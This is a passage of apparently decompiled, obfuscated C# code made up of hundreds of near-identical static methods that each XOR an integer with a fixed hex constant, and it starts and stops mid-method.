		return int_4 ^ 0x4F21CB07;
	}

	[Obsolete("Exclude")]
	public static int smethod_4661(int int_4)
	{
		return int_4 ^ 0x3B38378F;
	}

	[Obsolete("Exclude")]
	public static int smethod_4662(int int_4)
	{
		return int_4 ^ 0x42E694F6;
	}

	[Obsolete("Exclude")]
	public static int smethod_4663(int int_4)
	{
		return int_4 ^ 0x16986841;
	}

	[Obsolete("Exclude")]
	public static int smethod_4664(int int_4)
	{
		return int_4 ^ 0x34196A80;
	}

	[Obsolete("Exclude")]
	public static int smethod_4665(int int_4)
	{
		return int_4 ^ 0x701E3E0A;
	}

	[Obsolete("Exclude")]
	public static int smethod_4666(int int_4)
	{
		return int_4 ^ 0x638ADBF4;
	}

	[Obsolete("Exclude")]
	public static int smethod_4667(int int_4)
	{
		return int_4 ^ 0x6C1A416A;
	}

	[Obsolete("Exclude")]
	public static int smethod_4668(int int_4)
	{
		return int_4 ^ 0x7BB9420D;
	}

	[Obsolete("Exclude")]
	public static int smethod_4669(int int_4)
	{
		return int_4 ^ 0x153BCAEC;
	}

	[Obsolete("Exclude")]
	public static int smethod_4670(int int_4)
	{
		return int_4 ^ 0x3606BAC8;
	}

	[Obsolete("Exclude")]
	public static int smethod_4671(int int_4)
	{
		return int_4 ^ 0x3128283D;
	}

	[Obsolete("Exclude")]
	public static int smethod_4672(int int_4)
	{
		return int_4 ^ 0x7CC76640;
	}

	[Obsolete("Exclude")]
	public static int smethod_4673(int int_4)
	{
		return int_4 ^ 0x3E45AE2C;
	}

	[Obsolete("Exclude")]
	public static int smethod_4674(int int_4)
	{
		return int_4 ^ 0x81904CF;
	}

	[Obsolete("Exclude")]
	public static int smethod_4675(int int_4)
	{
		return int_4 ^ 0x3353F4C0;
	}

	[Obsolete("Exclude")]
	public static int smethod_4676(int int_4)
	{
		return int_4 ^ 0x45CBFBF3;
	}

	[Obsolete("Exclude")]
	public static int smethod_4677(int int_4)
	{
		return int_4 ^ 0x67C2208E;
	}

	[Obsolete("Exclude")]
	public static int smethod_4678(int int_4)
	{
		return int_4 ^ 0x1C07B22A;
	}

	[Obsolete("Exclude")]
	public static int smethod_4679(int int_4)
	{
		return int_4 ^ 0x28654FF8;
	}

	[Obsolete("Exclude")]
	public static int smethod_4680(int int_4)
	{
		return int_4 ^ 0x7C07E1A4;
	}

	[Obsolete("Exclude")]
	public static int smethod_4681(int int_4)
	{
		return int_4 ^ 0x26AFDBC7;
	}

	[Obsolete("Exclude")]
	public static int smethod_4682(int int_4)
	{
		return int_4 ^ 0x231938A7;
	}

	[Obsolete("Exclude")]
	public static int smethod_4683(int int_4)
	{
		return int_4 ^ 0x5BA3652D;
	}

	[Obsolete("Exclude")]
	public static int smethod_4684(int int_4)
	{
		return int_4 ^ 0x67E3B4BA;
	}

	[Obsolete("Exclude")]
	public static int smethod_4685(int int_4)
	{
		return int_4 ^ 0x1DFF9ECD;
	}

	[Obsolete("Exclude")]
	public static int smethod_4686(int int_4)
	{
		return int_4 ^ 0x71671C61;
	}

	[Obsolete("Exclude")]
	public static int smethod_4688(int int_4)
	{
		return int_4 ^ 0x40E59516;
	}

	[Obsolete("Exclude")]
	public static int smethod_4689(int int_4)
	{
		return int_4 ^ 0x1CEFF6E2;
	}

	[Obsolete("Exclude")]
	public static int smethod_4690(int int_4)
	{
		return int_4 ^ 0x59D46BE6;
	}

	[Obsolete("Exclude")]
	public static int smethod_4691(int int_4)
	{
		return int_4 ^ 0x714F02CB;
	}

	[Obsolete("Exclude")]
	public static int smethod_4692(int int_4)
	{
		return int_4 ^ 0x75FB808A;
	}

	[Obsolete("Exclude")]
	public static int smethod_4693(int int_4)
	{
		return int_4 ^ 0x5771DB2F;
	}

	[Obsolete("Exclude")]
	public static int smethod_4694(int int_4)
	{
		return int_4 ^ 0x256A5A5B;
	}

	[Obsolete("Exclude")]
	public static int smethod_4695(int int_4)
	{
		return int_4 ^ 0x50A164B9;
	}

	[Obsolete("Exclude")]
	public static int smethod_4696(int int_4)
	{
		return int_4 ^ 0x8AC58C6;
	}

	[Obsolete("Exclude")]
	public static int smethod_4697(int int_4)
	{
		return int_4 ^ 0x34980D03;
	}

	[Obsolete("Exclude")]
	public static int smethod_4698(int int_4)
	{
		return int_4 ^ 0x77B3FAAE;
	}

	[Obsolete("Exclude")]
	public static int smethod_4699(int int_4)
	{
		return int_4 ^ 0x62924A92;
	}

	[Obsolete("Exclude")]
	public static int smethod_4700(int int_4)
	{
		return int_4 ^ 0xE7016B1;
	}

	[Obsolete("Exclude")]
	public static int smethod_4702(int int_4)
	{
		return int_4 ^ 0x53D1533B;
	}

	[Obsolete("Exclude")]
	public static int smethod_4703(int int_4)
	{
		return int_4 ^ 0xEDF4601;
	}

	[Obsolete("Exclude")]
	public static int smethod_4704(int int_4)
	{
		return int_4 ^ 0x4A5A649D;
	}

	[Obsolete("Exclude")]
	public static int smethod_4705(int int_4)
	{
		return int_4 ^ 0x4257B904;
	}

	[Obsolete("Exclude")]
	public static int smethod_4706(int int_4)
	{
		return int_4 ^ 0x6FEFC254;
	}

	[Obsolete("Exclude")]
	public static int smethod_4707(int int_4)
	{
		return int_4 ^ 0x2B7504B5;
	}

	[Obsolete("Exclude")]
	public static int smethod_4708(int int_4)
	{
		return int_4 ^ 0x2B76D7C9;
	}

	[Obsolete("Exclude")]
	public static int smethod_4709(int int_4)
	{
		return int_4 ^ 0x61D11D3A;
	}

	[Obsolete("Exclude")]
	public static int smethod_4710(int int_4)
	{
		return int_4 ^ 0x27422154;
	}

	[Obsolete("Exclude")]
	public static int smethod_4711(int int_4)
	{
		return int_4 ^ 0x7DC8F99B;
	}

	[Obsolete("Exclude")]
	public static int smethod_4712(int int_4)
	{
		return int_4 ^ 0x660DAC28;
	}

	[Obsolete("Exclude")]
	public static int smethod_4713(int int_4)
	{
		return int_4 ^ 0x244154F2;
	}

	[Obsolete("Exclude")]
	public static int smethod_4714(int int_4)
	{
		return int_4 ^ 0x12779711;
	}

	[Obsolete("Exclude")]
	public static int smethod_4715(int int_4)
	{
		return int_4 ^ 0x53813270;
	}

	[Obsolete("Exclude")]
	public static int smethod_4716(int int_4)
	{
		return int_4 ^ 0xD6140CE;
	}

	[Obsolete("Exclude")]
	public static int smethod_4717(int int_4)
	{
		return int_4 ^ 0x3FEE78B3;
	}

	[Obsolete("Exclude")]
	public static int smethod_4718(int int_4)
	{
		return int_4 ^ 0x2DAB51FB;
	}

	[Obsolete("Exclude")]
	public static int smethod_4719(int int_4)
	{
		return int_4 ^ 0x5AFC18AF;
	}

	[Obsolete("Exclude")]
	public static int smethod_4720(int int_4)
	{
		return int_4 ^ 0x42CF045C;
	}

	[Obsolete("Exclude")]
	public static int smethod_4721(int int_4)
	{
		return int_4 ^ 0x1ACF9D92;
	}

	[Obsolete("Exclude")]
	public static int smethod_4722(int int_4)
	{
		return int_4 ^ 0x1ED1B927;
	}

	[Obsolete("Exclude")]
	public static int smethod_4723(int int_4)
	{
		return int_4 ^ 0xAA9A34D;
	}

	[Obsolete("Exclude")]
	public static int smethod_4724(int int_4)
	{
		return int_4 ^ 0x72D8410B;
	}

	[Obsolete("Exclude")]
	public static int smethod_4725(int int_4)
	{
		return int_4 ^ 0x7C56DB65;
	}

	[Obsolete("Exclude")]
	public static int smethod_4726(int int_4)
	{
		return int_4 ^ 0x657D0C1;
	}

	[Obsolete("Exclude")]
	public static int smethod_4727(int int_4)
	{
		return int_4 ^ 0xF09CD0B;
	}

	[Obsolete("Exclude")]
	public static int smethod_4728(int int_4)
	{
		return int_4 ^ 0x14369093;
	}

	[Obsolete("Exclude")]
	public static int smethod_4729(int int_4)
	{
		return int_4 ^ 0x28E32D3F;
	}

	[Obsolete("Exclude")]
	public static int smethod_4730(int int_4)
	{
		return int_4 ^ 0x53A19869;
	}

	[Obsolete("Exclude")]
	public static int smethod_4731(int int_4)
	{
		return int_4 ^ 0x17A0A58F;
	}

	[Obsolete("Exclude")]
	public static int smethod_4732(int int_4)
	{
		return int_4 ^ 0x10066D62;
	}

	[Obsolete("Exclude")]
	public static int smethod_4733(int int_4)
	{
		return int_4 ^ 0x6520FCE8;
	}

	[Obsolete("Exclude")]
	public static int smethod_4734(int int_4)
	{
		return int_4 ^ 0x1E513CE4;
	}

	[Obsolete("Exclude")]
	public static int smethod_4735(int int_4)
	{
		return int_4 ^ 0x456366F1;
	}

	[Obsolete("Exclude")]
	public static int smethod_4736(int int_4)
	{
		return int_4 ^ 0x4F06A866;
	}

	[Obsolete("Exclude")]
	public static int smethod_4737(int int_4)
	{
		return int_4 ^ 0x28921B14;
	}

	[Obsolete("Exclude")]
	public static int smethod_4738(int int_4)
	{
		return int_4 ^ 0x1379C8B5;
	}

	[Obsolete("Exclude")]
	public static int smethod_4739(int int_4)
	{
		return int_4 ^ 0x6BD3F2;
	}

	[Obsolete("Exclude")]
	public static int smethod_4740(int int_4)
	{
		return int_4 ^ 0x6C6630A0;
	}

	[Obsolete("Exclude")]
	public static int smethod_4741(int int_4)
	{
		return int_4 ^ 0x60C5EF2;
	}

	[Obsolete("Exclude")]
	public static int smethod_4742(int int_4)
	{
		return int_4 ^ 0x6C85F178;
	}

	[Obsolete("Exclude")]
	public static int smethod_4744(int int_4)
	{
		return int_4 ^ 0x1FFE9C5F;
	}

	[Obsolete("Exclude")]
	public static int smethod_4745(int int_4)
	{
		return int_4 ^ 0x5819C195;
	}

	[Obsolete("Exclude")]
	public static int smethod_4746(int int_4)
	{
		return int_4 ^ 0x1253489D;
	}

	[Obsolete("Exclude")]
	public static int smethod_4747(int int_4)
	{
		return int_4 ^ 0x4ED1046B;
	}

	[Obsolete("Exclude")]
	public static int smethod_4748(int int_4)
	{
		return int_4 ^ 0x490874D7;
	}

	[Obsolete("Exclude")]
	public static int smethod_4749(int int_4)
	{
		return int_4 ^ 0x33E0D13B;
	}

	[Obsolete("Exclude")]
	public static int smethod_4750(int int_4)
	{
		return int_4 ^ 0x4C91828F;
	}

	[Obsolete("Exclude")]
	public static int smethod_4751(int int_4)
	{
		return int_4 ^ 0x75BB54E5;
	}

	[Obsolete("Exclude")]
	public static int smethod_4752(int int_4)
	{
		return int_4 ^ 0x5CBC2A87;
	}

	[Obsolete("Exclude")]
	public static int smethod_4753(int int_4)
	{
		return int_4 ^ 0x5E12BA83;
	}

	[Obsolete("Exclude")]
	public static int smethod_4754(int int_4)
	{
		return int_4 ^ 0x35DD1CC;
	}

	[Obsolete("Exclude")]
	public static int smethod_4755(int int_4)
	{
		return int_4 ^ 0x23A762AE;
	}

	[Obsolete("Exclude")]
	public static int smethod_4756(int int_4)
	{
		return int_4 ^ 0x2B6335C9;
	}

	[Obsolete("Exclude")]
	public static int smethod_4757(int int_4)
	{
		return int_4 ^ 0x3D198430;
	}

	[Obsolete("Exclude")]
	public static int smethod_4758(int int_4)
	{
		return int_4 ^ 0x1B13625D;
	}

	[Obsolete("Exclude")]
	public static int smethod_4759(int int_4)
	{
		return int_4 ^ 0x28A30DCC;
	}

	[Obsolete("Exclude")]
	public static int smethod_4760(int int_4)
	{
		return int_4 ^ 0x27E1EF57;
	}

	[Obsolete("Exclude")]
	public static int smethod_4761(int int_4)
	{
		return int_4 ^ 0x105411AF;
	}

	[Obsolete("Exclude")]
	public static int smethod_4762(int int_4)
	{
		return int_4 ^ 0x7854CB8;
	}

	[Obsolete("Exclude")]
	public static int smethod_4763(int int_4)
	{
		return int_4 ^ 0x57E6629A;
	}

	[Obsolete("Exclude")]
	public static int smethod_4764(int int_4)
	{
		return int_4 ^ 0x3B8DF7D;
	}

	[Obsolete("Exclude")]
	public static int smethod_4765(int int_4)
	{
		return int_4 ^ 0x352E5540;
	}

	[Obsolete("Exclude")]
	public static int smethod_4766(int int_4)
	{
		return int_4 ^ 0x29D829B0;
	}

	[Obsolete("Exclude")]
	public static int smethod_4767(int int_4)
	{
		return int_4 ^ 0x50AE8150;
	}

	[Obsolete("Exclude")]
	public static int smethod_4768(int int_4)
	{
		return int_4 ^ 0x17AE93EA;
	}

	[Obsolete("Exclude")]
	public static int smethod_4769(int int_4)
	{
		return int_4 ^ 0x544E5107;
	}

	[Obsolete("Exclude")]
	public static int smethod_4770(int int_4)
	{
		return int_4 ^ 0x769FE131;
	}

	[Obsolete("Exclude")]
	public static int smethod_4771(int int_4)
	{
		return int_4 ^ 0x886555A;
	}

	[Obsolete("Exclude")]
	public static int smethod_4772(int int_4)
	{
		return int_4 ^ 0xB7D65C1;
	}

	[Obsolete("Exclude")]
	public static int smethod_4773(int int_4)
	{
		return int_4 ^ 0x71C4139C;
	}

	[Obsolete("Exclude")]
	public static int smethod_4774(int int_4)
	{
		return int_4 ^ 0xC3DA729;
	}

	[Obsolete("Exclude")]
	public static int smethod_4775(int int_4)
	{
		return int_4 ^ 0xA6BCFCB;
	}

	[Obsolete("Exclude")]
	public static int smethod_4776(int int_4)
	{
		return int_4 ^ 0x7DC8CCF3;
	}

	[Obsolete("Exclude")]
	public static int smethod_4777(int int_4)
	{
		return int_4 ^ 0x19E70751;
	}

	[Obsolete("Exclude")]
	public static int smethod_4778(int int_4)
	{
		return int_4 ^ 0x285BE061;
	}

	[Obsolete("Exclude")]
	public static int smethod_4779(int int_4)
	{
		return int_4 ^ 0x5BC6B20;
	}

	[Obsolete("Exclude")]
	public static int smethod_4780(int int_4)
	{
		return int_4 ^ 0x7AC585B0;
	}

	[Obsolete("Exclude")]
	public static int smethod_4781(int int_4)
	{
		return int_4 ^ 0x44DDBC9E;
	}

	[Obsolete("Exclude")]
	public static int smethod_4782(int int_4)
	{
		return int_4 ^ 0x79F747EB;
	}

	[Obsolete("Exclude")]
	public static int smethod_4783(int int_4)
	{
		return int_4 ^ 0x2616C12E;
	}

	[Obsolete("Exclude")]
	public static int smethod_4784(int int_4)
	{
		return int_4 ^ 0x49C36CBB;
	}

	[Obsolete("Exclude")]
	public static int smethod_4785(int int_4)
	{
		return int_4 ^ 0x58F96505;
	}

	[Obsolete("Exclude")]
	public static int smethod_4786(int int_4)
	{
		return int_4 ^ 0x1AE04A9E;
	}

	[Obsolete("Exclude")]
	public static int smethod_4787(int int_4)
	{
		return int_4 ^ 0x9244C29;
	}

	[Obsolete("Exclude")]
	public static int smethod_4788(int int_4)
	{
		return int_4 ^ 0x14865C07;
	}

	[Obsolete("Exclude")]
	public static int smethod_4790(int int_4)
	{
		return int_4 ^ 0x42B00485;
	}

	[Obsolete("Exclude")]
	public static int smethod_4791(int int_4)
	{
		return int_4 ^ 0x46F43EC;
	}

	[Obsolete("Exclude")]
	public static int smethod_4792(int int_4)
	{
		return int_4 ^ 0x346B769E;
	}

	[Obsolete("Exclude")]
	public static int smethod_4793(int int_4)
	{
		return int_4 ^ 0x7B517EA1;
	}

	[Obsolete("Exclude")]
	public static int smethod_4794(int int_4)
	{
		return int_4 ^ 0x50D9BE48;
	}

	[Obsolete("Exclude")]
	public static int smethod_4795(int int_4)
	{
		return int_4 ^ 0x55C35950;
	}

	[Obsolete("Exclude")]
	public static int smethod_4796(int int_4)
	{
		return int_4 ^ 0x293E45A1;
	}

	[Obsolete("Exclude")]
	public static int smethod_4797(int int_4)
	{
		return int_4 ^ 0xDE666B1;
	}

	[Obsolete("Exclude")]
	public static int smethod_4798(int int_4)
	{
		return int_4 ^ 0x44B0AA3;
	}

	[Obsolete("Exclude")]
	public static int smethod_4799(int int_4)
	{
		return int_4 ^ 0x3581BB25;
	}

	[Obsolete("Exclude")]
	public static int smethod_4800(int int_4)
	{
		return int_4 ^ 0x22C9CCD0;
	}

	[Obsolete("Exclude")]
	public static int smethod_4801(int int_4)
	{
		return int_4 ^ 0x37755880;
	}

	[Obsolete("Exclude")]
	public static int smethod_4802(int int_4)
	{
		return int_4 ^ 0x94D1DD5;
	}

	[Obsolete("Exclude")]
	public static int smethod_4803(int int_4)
	{
		return int_4 ^ 0x4484CF72;
	}

	[Obsolete("Exclude")]
	public static int smethod_4804(int int_4)
	{
		return int_4 ^ 0x797D8ECA;
	}

	[Obsolete("Exclude")]
	public static int smethod_4805(int int_4)
	{
		return int_4 ^ 0x2BBDD9AB;
	}

	[Obsolete("Exclude")]
	public static int smethod_4806(int int_4)
	{
		return int_4 ^ 0x62B33560;
	}

	[Obsolete("Exclude")]
	public static int smethod_4807(int int_4)
	{
		return int_4 ^ 0x2299F104;
	}

	[Obsolete("Exclude")]
	public static int smethod_4808(int int_4)
	{
		return int_4 ^ 0x402B40FB;
	}

	[Obsolete("Exclude")]
	public static int smethod_4809(int int_4)
	{
		return int_4 ^ 0x69493A37;
	}

	[Obsolete("Exclude")]
	public static int smethod_4810(int int_4)
	{
		return int_4 ^ 0x13018E16;
	}

	[Obsolete("Exclude")]
	public static int smethod_4812(int int_4)
	{
		return int_4 ^ 0x73A7E13A;
	}

	[Obsolete("Exclude")]
	public static int smethod_4813(int int_4)
	{
		return int_4 ^ 0x7C3AEA3D;
	}

	[Obsolete("Exclude")]
	public static int smethod_4814(int int_4)
	{
		return int_4 ^ 0xE79E46E;
	}

	[Obsolete("Exclude")]
	public static int smethod_4815(int int_4)
	{
		return int_4 ^ 0x3BAFC8DF;
	}

	[Obsolete("Exclude")]
	public static int smethod_4816(int int_4)
	{
		return int_4 ^ 0x68D0FA7F;
	}

	[Obsolete("Exclude")]
	public static int smethod_4817(int int_4)
	{
		return int_4 ^ 0x65432193;
	}

	[Obsolete("Exclude")]
	public static int smethod_4818(int int_4)
	{
		return int_4 ^ 0x516682BF;
	}

	[Obsolete("Exclude")]
	public static int smethod_4819(int int_4)
	{
		return int_4 ^ 0x244F900C;
	}

	[Obsolete("Exclude")]
	public static int smethod_4820(int int_4)
	{
		return int_4 ^ 0x18BED445;
	}

	[Obsolete("Exclude")]
	public static int smethod_4821(int int_4)
	{
		return int_4 ^ 0xCC96F96;
	}

	[Obsolete("Exclude")]
	public static int smethod_4822(int int_4)
	{
		return int_4 ^ 0x139D97F0;
	}

	[Obsolete("Exclude")]
	public static int smethod_4823(int int_4)
	{
		return int_4 ^ 0xC302076;
	}

	[Obsolete("Exclude")]
	public static int smethod_4824(int int_4)
	{
		return int_4 ^ 0x49A91D27;
	}

	[Obsolete("Exclude")]
	public static int smethod_4825(int int_4)
	{
		return int_4 ^ 0x557573D9;
	}

	[Obsolete("Exclude")]
	public static int smethod_4826(int int_4)
	{
		return int_4 ^ 0x1CEA6940;
	}

	[Obsolete("Exclude")]
	public static int smethod_4827(int int_4)
	{
		return int_4 ^ 0x1614D0B6;
	}

	[Obsolete("Exclude")]
	public static int smethod_4828(int int_4)
	{
		return int_4 ^ 0x41F66B35;
	}

	[Obsolete("Exclude")]
	public static int smethod_4829(int int_4)
	{
		return int_4 ^ 0x1324309B;
	}

	[Obsolete("Exclude")]
	public static int smethod_4830(int int_4)
	{
		return int_4 ^ 0xDC8B512;
	}

	[Obsolete("Exclude")]
	public static int smethod_4831(int int_4)
	{
		return int_4 ^ 0xCE6004D;
	}

	[Obsolete("Exclude")]
	public static int smethod_4833(int int_4)
	{
		return int_4 ^ 0x6D18F477;
	}

	[Obsolete("Exclude")]
	public static int smethod_4834(int int_4)
	{
		return int_4 ^ 0x1184F9F1;
	}

	[Obsolete("Exclude")]
	public static int smethod_4835(int int_4)
	{
		return int_4 ^ 0x5AB62002;
	}

	[Obsolete("Exclude")]
	public static int smethod_4836(int int_4)
	{
		return int_4 ^ 0x1515E578;
	}

	[Obsolete("Exclude")]
	public static int smethod_4837(int int_4)
	{
		return int_4 ^ 0x55B20C8F;
	}

	[Obsolete("Exclude")]
	public static int smethod_4838(int int_4)
	{
		return int_4 ^ 0x728DD39D;
	}

	[Obsolete("Exclude")]
	public static int smethod_4839(int int_4)
	{
		return int_4 ^ 0x623A87B4;
	}

	[Obsolete("Exclude")]
	public static int smethod_4840(int int_4)
	{
		return int_4 ^ 0x3E0CAD06;
	}

	[Obsolete("Exclude")]
	public static int smethod_4841(int int_4)
	{
		return int_4 ^ 0x4FE40F99;
	}

	[Obsolete("Exclude")]
	public static int smethod_4842(int int_4)
	{
		return int_4 ^ 0x692BA7DB;
	}

	[Obsolete("Exclude")]
	public static int smethod_4843(int int_4)
	{
		return int_4 ^ 0xAD4A033;
	}

	[Obsolete("Exclude")]
	public static int smethod_4844(int int_4)
	{
		return int_4 ^ 0x89993BD;
	}

	[Obsolete("Exclude")]
	public static int smethod_4845(int int_4)
	{
		return int_4 ^ 0x3E98B7F5;
	}

	[Obsolete("Exclude")]
	public static int smethod_4846(int int_4)
	{
		return int_4 ^ 0x24B8BE1D;
	}

	[Obsolete("Exclude")]
	public static int smethod_4847(int int_4)
	{
		return int_4 ^ 0x714D0ECA;
	}

	[Obsolete("Exclude")]
	public static int smethod_4848(int int_4)
	{
		return int_4 ^ 0x6B93843C;
	}

	[Obsolete("Exclude")]
	public static int smethod_4849(int int_4)
	{
		return int_4 ^ 0x4422CF9;
	}

	[Obsolete("Exclude")]
	public static int smethod_4850(int int_4)
	{
		return int_4 ^ 0x7462BAC5;
	}

	[Obsolete("Exclude")]
	public static int smethod_4851(int int_4)
	{
		return int_4 ^ 0x2A8A9036;
	}

	[Obsolete("Exclude")]
	public static int smethod_4852(int int_4)
	{
		return int_4 ^ 0xE4D8159;
	}

	[Obsolete("Exclude")]
	public static int smethod_4853(int int_4)
	{
		return int_4 ^ 0x7EF0DA9;
	}

	[Obsolete("Exclude")]
	public static int smethod_4854(int int_4)
	{
		return int_4 ^ 0x5FD57673;
	}

	[Obsolete("Exclude")]
	public static int smethod_4855(int int_4)
	{
		return int_4 ^ 0x4BEFFDAE;
	}

	[Obsolete("Exclude")]
	public static int smethod_4856(int int_4)
	{
		return int_4 ^ 0x712E984F;
	}

	[Obsolete("Exclude")]
	public static int smethod_4857(int int_4)
	{
		return int_4 ^ 0x97CB17;
	}

	[Obsolete("Exclude")]
	public static int smethod_4858(int int_4)
	{
		return int_4 ^ 0x2A2B2E66;
	}

	[Obsolete("Exclude")]
	public static int smethod_4859(int int_4)
	{
		return int_4 ^ 0x7D7AC328;
	}

	[Obsolete("Exclude")]
	public static int smethod_4860(int int_4)
	{
		return int_4 ^ 0x2C60FA2E;
	}

	[Obsolete("Exclude")]
	public static int smethod_4861(int int_4)
	{
		return int_4 ^ 0x3A99EC13;
	}

	[Obsolete("Exclude")]
	public static int smethod_4862(int int_4)
	{
		return int_4 ^ 0x287ABD0A;
	}

	[Obsolete("Exclude")]
	public static int smethod_4863(int int_4)
	{
		return int_4 ^ 0x6F9F5B2;
	}

	[Obsolete("Exclude")]
	public static int smethod_4864(int int_4)
	{
		return int_4 ^ 0xC506DCE;
	}

	[Obsolete("Exclude")]
	public static int smethod_4865(int int_4)
	{
		return int_4 ^ 0x6D9E2AF8;
	}

	[Obsolete("Exclude")]
	public static int smethod_4866(int int_4)
	{
		return int_4 ^ 0x4FE4618B;
	}

	[Obsolete("Exclude")]
	public static int smethod_4867(int int_4)
	{
		return int_4 ^ 0x6ED44300;
	}

	[Obsolete("Exclude")]
	public static int smethod_4868(int int_4)
	{
		return int_4 ^ 0x7E2A7CA0;
	}

	[Obsolete("Exclude")]
	public static int smethod_4869(int int_4)
	{
		return int_4 ^ 0x5B3D409C;
	}

	[Obsolete("Exclude")]
	public static int smethod_4870(int int_4)
	{
		return int_4 ^ 0x345788D9;
	}

	[Obsolete("Exclude")]
	public static int smethod_4871(int int_4)
	{
		return int_4 ^ 0x34897F89;
	}

	[Obsolete("Exclude")]
	public static int smethod_4872(int int_4)
	{
		return int_4 ^ 0x4977C767;
	}

	[Obsolete("Exclude")]
	public static int smethod_4873(int int_4)
	{
		return int_4 ^ 0x4C44A4D3;
	}

	[Obsolete("Exclude")]
	public static int smethod_4874(int int_4)
	{
		return int_4 ^ 0x5F2651EB;
	}

	[Obsolete("Exclude")]
	public static int smethod_4875(int int_4)
	{
		return int_4 ^ 0x7BCC6E0;
	}

	[Obsolete("Exclude")]
	public static int smethod_4876(int int_4)
	{
		return int_4 ^ 0x4799CF7D;
	}

	[Obsolete("Exclude")]
	public static int smethod_4877(int int_4)
	{
		return int_4 ^ 0x32E76339;
	}

	[Obsolete("Exclude")]
	public static int smethod_4878(int int_4)
	{
		return int_4 ^ 0x3D3F2F6C;
	}

	[Obsolete("Exclude")]
	public static int smethod_4879(int int_4)
	{
		return int_4 ^ 0x52B5053;
	}

	[Obsolete("Exclude")]
	public static int smethod_4880(int int_4)
	{
		return int_4 ^ 0xCF0C26C;
	}

	[Obsolete("Exclude")]
	public static int smethod_4881(int int_4)
	{
		return int_4 ^ 0x3DA23EA1;
	}

	[Obsolete("Exclude")]
	public static int smethod_4882(int int_4)
	{
		return int_4 ^ 0x1D95F7D;
	}

	[Obsolete("Exclude")]
	public static int smethod_4883(int int_4)
	{
		return int_4 ^ 0x649CF6A9;
	}

	[Obsolete("Exclude")]
	public static int smethod_4884(int int_4)
	{
		return int_4 ^ 0x2BC6BC34;
	}

	[Obsolete("Exclude")]
	public static int smethod_4885(int int_4)
	{
		return int_4 ^ 0x49DC9A0C;
	}

	[Obsolete("Exclude")]
	public static int smethod_4886(int int_4)
	{
		return int_4 ^ 0x2526B467;
	}

	[Obsolete("Exclude")]
	public static int smethod_4887(int int_4)
	{
		return int_4 ^ 0x32CC7A72;
	}

	[Obsolete("Exclude")]
	public static int smethod_4888(int int_4)
	{
		return int_4 ^ 0x9F8774D;
	}

	[Obsolete("Exclude")]
	public static int smethod_4889(int int_4)
	{
		return int_4 ^ 0x67AF453D;
	}

	[Obsolete("Exclude")]
	public static int smethod_4890(int int_4)
	{
		return int_4 ^ 0x17E2AAFB;
	}

	[Obsolete("Exclude")]
	public static int smethod_4891(int int_4)
	{
		return int_4 ^ 0x57A669E4;
	}

	[Obsolete("Exclude")]
	public static int smethod_4892(int int_4)
	{
		return int_4 ^ 0x5183D3F;
	}

	[Obsolete("Exclude")]
	public static int smethod_4893(int int_4)
	{
		return int_4 ^ 0x42CC9D17;
	}

	[Obsolete("Exclude")]
	public static int smethod_4894(int int_4)
	{
		return int_4 ^ 0x62760CC7;
	}

	[Obsolete("Exclude")]
	public static int smethod_4895(int int_4)
	{
		return int_4 ^ 0x2A62714D;
	}

	[Obsolete("Exclude")]
	public static int smethod_4897(int int_4)
	{
		return int_4 ^ 0x1C82B755;
	}

	[Obsolete("Exclude")]
	public static int smethod_4898(int int_4)
	{
		return int_4 ^ 0x137B7C59;
	}

	[Obsolete("Exclude")]
	public static int smethod_4899(int int_4)
	{
		return int_4 ^ 0x15A18EE7;
	}

	[Obsolete("Exclude")]
	public static int smethod_4900(int int_4)
	{
		return int_4 ^ 0x7ACAD2D2;
	}

	[Obsolete("Exclude")]
	public static int smethod_4901(int int_4)
	{
		return int_4 ^ 0x12519F0D;
	}

	[Obsolete("Exclude")]
	public static int smethod_4902(int int_4)
	{
		return int_4 ^ 0x5C1EB2FA;
	}

	[Obsolete("Exclude")]
	public static int smethod_4903(int int_4)
	{
		return int_4 ^ 0x353B8689;
	}

	[Obsolete("Exclude")]
	public static int smethod_4904(int int_4)
	{
		return int_4 ^ 0x44DBDCAE;
	}

	[Obsolete("Exclude")]
	public static int smethod_4905(int int_4)
	{
		return int_4 ^ 0x45DA634A;
	}

	[Obsolete("Exclude")]
	public static int smethod_4906(int int_4)
	{
		return int_4 ^ 0x56DCF3B6;
	}

	[Obsolete("Exclude")]
	public static int smethod_4907(int int_4)
	{
		return int_4 ^ 0x44D8D994;
	}

	[Obsolete("Exclude")]
	public static int smethod_4908(int int_4)
	{
		return int_4 ^ 0x38BBBB4;
	}

	[Obsolete("Exclude")]
	public static int smethod_4909(int int_4)
	{
		return int_4 ^ 0x181986CB;
	}

	[Obsolete("Exclude")]
	public static int smethod_4910(int int_4)
	{
		return int_4 ^ 0x2BC2321B;
	}

	[Obsolete("Exclude")]
	public static int smethod_4911(int int_4)
	{
		return int_4 ^ 0x73613BFB;
	}

	[Obsolete("Exclude")]
	public static int smethod_4912(int int_4)
	{
		return int_4 ^ 0x3A8EEEDB;
	}

	[Obsolete("Exclude")]
	public static int smethod_4913(int int_4)
	{
		return int_4 ^ 0x1947C3A2;
	}

	[Obsolete("Exclude")]
	public static int smethod_4914(int int_4)
	{
		return int_4 ^ 0x41C034C5;
	}

	[Obsolete("Exclude")]
	public static int smethod_4915(int int_4)
	{
		return int_4 ^ 0x22CB607F;
	}

	[Obsolete("Exclude")]
	public static int smethod_4916(int int_4)
	{
		return int_4 ^ 0x5AEAC33;
	}

	[Obsolete("Exclude")]
	public static int smethod_4917(int int_4)
	{
		return int_4 ^ 0x64F5792F;
	}

	[Obsolete("Exclude")]
	public static int smethod_4918(int int_4)
	{
		return int_4 ^ 0x5F2A9A8F;
	}

	[Obsolete("Exclude")]
	public static int smethod_4919(int int_4)
	{
		return int_4 ^ 0xC4CEE37;
	}

	[Obsolete("Exclude")]
	public static int smethod_4920(int int_4)
	{
		return int_4 ^ 0x360F6EBD;
	}

	[Obsolete("Exclude")]
	public static int smethod_4921(int int_4)
	{
		return int_4 ^ 0x571B0CAF;
	}

	[Obsolete("Exclude")]
	public static int smethod_4923(int int_4)
	{
		return int_4 ^ 0x79913164;
	}

	[Obsolete("Exclude")]
	public static int smethod_4924(int int_4)
	{
		return int_4 ^ 0x790E4FFF;
	}

	[Obsolete("Exclude")]
	public static int smethod_4925(int int_4)
	{
		return int_4 ^ 0x6FC8DE3;
	}

	[Obsolete("Exclude")]
	public static int smethod_4926(int int_4)
	{
		return int_4 ^ 0x22F0A971;
	}

	[Obsolete("Exclude")]
	public static int smethod_4927(int int_4)
	{
		return int_4 ^ 0x2D91D068;
	}

	[Obsolete("Exclude")]
	public static int smethod_4929(int int_4)
	{
		return int_4 ^ 0x36D448C6;
	}

	[Obsolete("Exclude")]
	public static int smethod_4930(int int_4)
	{
